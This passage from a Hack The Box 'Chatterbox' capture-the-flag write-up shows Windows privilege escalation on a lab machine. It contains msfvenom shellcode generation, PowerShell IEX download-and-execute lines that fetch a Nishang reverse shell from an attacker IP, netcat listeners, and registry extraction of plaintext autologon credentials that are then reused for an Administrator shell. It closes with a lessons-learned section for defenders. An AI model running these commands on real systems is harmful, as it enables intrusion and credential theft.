<p><em>SetImpersonatePrivilege</em> is not enabled so we can’t use the <a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a> exploit to escalate privileges.</p>
<p>Run the <em>systeminfo</em> command.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_4AAvQEZjyYtSnMdNPGmCpQ.png" /></p>
<p>The box has 208 hotfixes installed so it’s unlikely that we can escalate privileges using a kernel exploit (although it might be possible, I haven’t checked).</p>
<p>Let’s see if we have access to the <em>Administrator </em>directory.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_a-mG45BDsR8lCDFPA3F2Rg.png" /></p>
<p>We do. That’s odd. Let’s try and view the<em> root.txt</em> flag.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_qutamKZ9EZ4eniFYXdOn2Q.png" /></p>
<p>We don’t have permission. View the permissions on the <em>root.txt</em> file.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_Io9LZSrwpeVl5r86ZbLR9Q.png" /></p>
<p>Only <em>Administrator</em> has full access (F) on this file. Let’s view the permissions on the <em>Desktop </em>directory. We must have some kind of permission on it because we’re able to enter it.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_8FN10LxJCfJHt2nDF_lwrw.png" /></p>
<p>We have full access (F) on the<em> Desktop </em>directory. The Alfred user is also configured to own the <em>root.txt</em> file.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_RB_nedflS2Jh2bnGom60fQ.png" /></p>
<p>So we can simply grant ourselves access to it using the following command.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_s6zsv0MsAAp0sp3n7NlOUA.png" /></p>
<p>View the permissions again to confirm that the change was made.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_YJVoWD189gUyAnYoOtuTjQ.png" /></p>
<p>Perfect! We should now be able to view the <em>root.txt</em> flag.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_5AV9M9Ls6XTQ2SO-gkwbAQ.png" /></p>
<p>Alright, all we did is view the root flag, we didn’t really escalate privileges. Unfortunately our shell can’t handle running PowerShell, so in the next section, we’ll start from the beginning and send a PowerShell reverse shell back to our target machine and from there we’ll escalate our privileges to <em>Administrator</em>.</p>
<h1 id="extra-content-the-powershell-solution">Extra Content: The PowerShell Solution</h1>
<p>View the options for PowerShell reverse shells in msfvenom.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_HLwepNg6SyWiuGIPICQGVA.png" /></p>
<p>We’ll go with the <em>powershell_reverse_tcp</em> option.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=10.10.14.7 LPORT=1234 -e x86/unicode_mixed -b &#39;\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#39; BufferRegister=EAX -f python
</pre></div>

<p>Unfortunately, this gives us a payload that is larger than the maximum size specified in the exploit.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_R2cIHjSY_Wf1ANRH_2L_UQ.png" /></p>
<p>So instead, we’ll just use the <em>windows/exec</em> module to download and execute the <a href="https://github.com/samratashok/nishang">Nishang</a> reverse shell.</p>
<p>Download the <a href="https://github.com/samratashok/nishang">Nishang</a> repository and copy the <em>Invoke-PowerShellTcp.ps1</em> script into your current directory.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>cp ../../tools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
<span class="lineno" data-linenos="2 "></span>mv Invoke-PowerShellTcp.ps1 shell.ps1
</pre></div>

<p>Add the following line to the end of the script with the attack machine configuration settings.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 1234
</pre></div>

<p>When called, this sends a reverse shell back to our attack machine on port 1234.</p>
<p>Setup a listener to receive the reverse shell.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nc -nlvp 1234
</pre></div>

<p>Next, use msfvenom to generate a payload that downloads the PowerShell script and executes it.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>msfvenom -a x86 --platform Windows -p windows/exec CMD=&quot;powershell -c iex(new-object net.webclient).downloadstring(&#39;[http://10.10.14.7:5555/shell.ps1&#39;](http://10.10.14.7:5555/shell.ps1&#39;))&quot; -e x86/unicode_mixed -b &#39;\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#39; BufferRegister=EAX -f python
</pre></div>

<p>We get back the following result.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>Found 1 compatible encoders
<span class="lineno" data-linenos=" 2 "></span>Attempting to encode payload with 1 iterations of x86/unicode_mixed
<span class="lineno" data-linenos=" 3 "></span>x86/unicode_mixed succeeded with size 684 (iteration=0)
<span class="lineno" data-linenos=" 4 "></span>x86/unicode_mixed chosen with final size 684
<span class="lineno" data-linenos=" 5 "></span>Payload size: 684 bytes
<span class="lineno" data-linenos=" 6 "></span>Final size of python file: 3330 bytes
<span class="lineno" data-linenos=" 7 "></span>buf =  b&quot;&quot;
<span class="lineno" data-linenos=" 8 "></span>buf += b&quot;\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49&quot;
<span class="lineno" data-linenos=" 9 "></span>buf += b&quot;\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41&quot;
<span class="lineno" data-linenos="10 "></span>buf += b&quot;\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41&quot;
<span class="lineno" data-linenos="11 "></span>buf += b&quot;\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51&quot;
<span class="lineno" data-linenos="12 "></span>.....[redacted]
</pre></div>

<p>Good! The payload size is 684 bytes, so it’s within the limit. Copy the payload and add it in place of the payload included in the exploit.</p>
<p>Start up a python server in the directory that the PowerShell script resides in.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>python -m SimpleHTTPServer 5555
</pre></div>

<p>Run the exploit.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>root@kali:~/Desktop/htb/chatterbox# python 36025.py
<span class="lineno" data-linenos="2 "></span>----&gt;{P00F}!
</pre></div>

<p>We get a PowerShell shell!</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_BqwL-qWlNezkn5G9g4eKFw.png" /></p>
<p>We’ll use the <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp.ps1</a> script to determine if there are any misconfigurations that lead to privilege escalation.</p>
<p>Upload and run the script on the target machine.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>PS C:\Users\Alfred\Desktop&gt; iex(new-object net.webclient).downloadstring(&#39;[http://10.10.14.7:5555/PowerUp.ps1&#39;](http://10.10.14.7:5555/PowerUp.ps1&#39;))
<span class="lineno" data-linenos="2 "></span>
<span class="lineno" data-linenos="3 "></span>PS C:\Users\Alfred\Desktop&gt; Invoke-AllChecks
</pre></div>

<p>We get back two interesting results.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>[*] Checking for Autologon credentials in registry...
<span class="lineno" data-linenos=" 2 "></span>
<span class="lineno" data-linenos=" 3 "></span>DefaultDomainName    :
<span class="lineno" data-linenos=" 4 "></span>DefaultUserName      : Alfred
<span class="lineno" data-linenos=" 5 "></span>DefaultPassword      : Welcome1!
<span class="lineno" data-linenos=" 6 "></span>AltDefaultDomainName :
<span class="lineno" data-linenos=" 7 "></span>AltDefaultUserName   :
<span class="lineno" data-linenos=" 8 "></span>AltDefaultPassword   :
<span class="lineno" data-linenos=" 9 "></span>
<span class="lineno" data-linenos="10 "></span>[*] Checking for unattended install files...
<span class="lineno" data-linenos="11 "></span>
<span class="lineno" data-linenos="12 "></span>UnattendPath : C:\Windows\Panther\Unattend.xml
</pre></div>

<p>Viewing the<em> Unattend.xml </em>file, we see that the password was redacted. So let’s focus on the Autologon credentials. The default username is “<em>Alfred</em>” and the default password is “<em>Welcome1!</em>”. I don’t have much experience with Windows, so I googled <a href="https://support.microsoft.com/en-ca/help/324737/how-to-turn-on-automatic-logon-in-windows">Autologin credentials</a> to learn more about it.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_oR22IbW1Do-rN8XOfFjtjQ.png" /></p>
<p>As stated in the article, these credentials are stored in the registry in plain text. The manual commands for extracting these credentials are:</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>PS C:\Windows\system32&gt; (Get-ItemProperty -Path &quot;HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
<span class="lineno" data-linenos="2 "></span>Alfred
<span class="lineno" data-linenos="3 "></span>
<span class="lineno" data-linenos="4 "></span>PS C:\Windows\system32&gt; (Get-ItemProperty -Path &quot;HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
<span class="lineno" data-linenos="5 "></span>Welcome1!
</pre></div>

<p>These credentials are set by the administrator. Since users have a tendency to reuse passwords, let’s see if the administrator account is set to the same password.</p>
<p>To do that, first run the following command to convert the plain text string “<em>Welcome1!</em>” into a secure string and store the result in the <em>\$password</em> variable.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>$password = ConvertTo-SecureString &#39;Welcome1!&#39; -AsPlainText -Force
</pre></div>

<ul>
<li>
<p><strong>ConvertTo-SecureString</strong>: Converts plain text to secure strings.</p>
</li>
<li>
<p><strong>-AsPlainText</strong>: Specifies a plain text string to convert to a secure string.</p>
</li>
<li>
<p><strong>-Force</strong>: Confirms that you understand the implications of using the <em>AsPlainText</em> parameter and still want to use it.</p>
</li>
</ul>
<p>Second, create a new object to store these credentials.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>$cred = New-Object System.Management.Automation.PSCredential(&#39;Administrator&#39;, $password)
</pre></div>

<p>Third, we’ll use these credentials to start PowerShell and send a (hopefully privileged) reverse shell back to our attack machine.</p>
<p>In the attack machine, copy the <em>shell.ps1</em> script we used earlier and save it in the file <em>shell-admin.ps1</em>.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>cp shell.ps1 shell-admin.ps1
</pre></div>

<p>Change <em>shell-admin.ps1</em> to send a reverse shell to our attack machine on port 6666.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 6666
</pre></div>

<p>Setup a python server in the directory that the script resides in.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>python -m SimpleHTTPServer 5555
</pre></div>

<p>Setup a listener to receive the reverse shell.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nc -nlvp 6666
</pre></div>

<p>On the target machine, use the credentials to start PowerShell to download the <em>shell-admin.ps1</em> script, run it and send a reverse shell back to our attack machine.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>Start-Process -FilePath &quot;powershell&quot; -argumentlist &quot;IEX(New-Object Net.WebClient).downloadString(&#39;[http://10.10.14.7:5555/shell-admin.ps1&#39;](http://10.10.14.7:5555/shell-admin.ps1&#39;))&quot; -Credential $cred
</pre></div>

<p>We get a shell with administrator privileges!</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_FzEuxFT88c3h8BlJVEsEVg.png" /></p>
<p>Now we can view the <em>root.txt</em> flag without having to change the ACL permissions on it.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_Bf2Jui2BxcVzj2W4SI-wIg.png" /></p>
<h1 id="lessons-learned">Lessons Learned</h1>
<p>To gain an initial foothold on the box we exploited one vulnerability.</p>
<ol>
<li>Buffer Overflow vulnerability. The AChat chat service being used was vulnerable to a known remote buffer overflow vulnerability. This allowed us to execute shell code on the box and send a reverse shell back to our attack machine. Since this is a known vulnerability, the administrator should have used the patched version of AChat or completely disabled the service if a patch is not available.</li>
</ol>
<p>To escalate privileges we exploited three vulnerabilities.</p>
<ol>
<li>
<p>Security misconfiguration. The <em>Alfred </em>user had full access on the <em>Administrator</em> directory and owned the <em>root.txt</em> file. Although we weren’t initially able to view the <em>root.txt</em> file, we did own it so we simply granted ourselves access to view the file. The administrator should have conformed to the principle of least privilege when setting up user permissions.</p>
</li>
<li>
<p>Automatic logon credentials saved in plaintext. Again, I’m not too familiar with the Windows system, but it seems like there is an option to store <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/protecting-the-automatic-logon-password">automatic logon credentials in encrypted form</a>. This way, as a non-privileged user we wouldn’t have been able to access these credentials.</p>
</li>
<li>
<p>Reuse of credentials. The administrator had setup his password to be the same as the password used for automatic logon. Since these credentials are saved in cleartext in the registry, we were able to view them and start up a PowerShell process that sent a privileged reverse shell back to our attack machine in the context of the Administrator user. It goes without saying that you should definitely not reuse credentials, especially when setting up a non-privileged account where the credentials will be stored in plaintext.</p>
</li>
</ol>
<h1 id="conclusion">Conclusion</h1>
<p>38 machines down, 8 more to go!</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_LsXRKmKEJnthpgDasMqkpQ.png" /></p>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../Irked Writeup/" title="33. Irked Writeup.md" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                33. Irked Writeup.md
              </span>
            </div>
          </a>
        
        
          <a href="../Bashed Writeup/" title="35. Bashed Writeup.md" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                35. Bashed Writeup.md
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Built by <a href="http://github.com/rushic24">Rushi</a> &copy; 2020
          </div>
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
  <div class="md-footer-social">
    <link rel="stylesheet" href="../../assets/fonts/font-awesome.css">
    
      <a href="https://github.com/rushic24" class="md-footer-social__link fa fa-"></a>
    
      <a href="https://www.linkedin.com/in/rushichaudhari" class="md-footer-social__link fa fa-"></a>
    
      <a href="" class="md-footer-social__link fa fa-"></a>
    
  </div>

    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
      
        <script src="../../js/katex.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"></script>
      
    
  </body>
</html>